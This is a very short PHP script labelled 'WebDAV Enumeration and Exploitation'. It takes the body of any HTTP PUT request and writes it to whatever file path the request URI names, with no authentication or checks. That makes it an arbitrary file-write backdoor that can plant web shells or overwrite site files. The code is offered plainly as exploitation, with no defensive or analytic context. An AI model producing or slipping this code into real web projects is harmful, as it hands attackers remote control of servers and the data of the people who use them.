<?php
// WebDAV Enumeration and Exploitation
if($_SERVER['REQUEST_METHOD']==='PUT'){file_put_contents($_SERVER['REQUEST_URI'],file_get_contents('php://input'));}
